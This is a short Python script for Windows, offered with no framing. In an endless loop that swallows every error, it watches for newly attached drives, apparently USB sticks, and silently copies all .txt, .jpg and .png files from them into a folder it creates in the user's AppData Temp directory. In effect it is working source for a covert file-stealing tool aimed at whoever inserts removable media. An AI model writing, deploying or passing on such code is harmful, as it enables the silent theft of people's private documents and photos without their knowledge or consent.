import shutil
import time
from ctypes import windll
import string
import os

def drive_find():
    bitmask = windll.kernel32.GetLogicalDrives()
    drive=list()
    for harf in string.ascii_uppercase:
        if bitmask & 1:
            drive.append(harf)
        bitmask>>=1
    return drive
username=os.getlogin()
if not os.path.exists("C:/Users/"+username+"/Appdata/Local/Temp/QP"):
    os.mkdir("C:/Users/"+username+"/Appdata/Local/Temp/QP")

while True:
    try:
        first=drive_find()
        time.sleep(10)
        second=drive_find()
        if len(second) > len(first):
            usb_drive= set(second)-set(first)
            for drive in usb_drive:
                for ky,ki,di in os.walk(drive+":/"):
                    for x in di:
                        if x.endswith(".txt") or x.endswith(".jpg") or x.endswith(".png"):
                            shutil.copy(ky+"/"+x,"C:/Users/"+username+"/Appdata/Local/Temp/QP")
    except:
        pass









